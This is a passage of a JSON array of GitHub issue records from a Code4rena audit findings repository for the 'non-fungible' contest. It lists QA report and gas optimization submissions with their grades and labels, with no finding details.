"QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/74", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-05"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/70", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-08"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/57", "labels": ["bug", "G (Gas Optimization)", "grade-b", "edited-by-warden", "G-07"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/55", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-06"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/54", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "Q-04"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/46", "labels": ["bug", "G (Gas Optimization)", "grade-b", "edited-by-warden", "G-05"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/45", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "edited-by-warden", "Q-03"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/40", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-02"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/39", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "edited-by-warden", "Q-01"], "target": "2022-11-non-fungible-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/38", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-04"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/34", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "G-03"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/19", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-02"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/18", "labels": ["bug", "G (Gas Optimization)", "grade-b", "edited-by-warden", "G-01"], "target": "2022-11-non-fungible-findings", "body": "Gas Optimizations"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/1", "labels": [], "target": "2022-11-non-fungible-findings", "body": "Agreements & Disclosures"}]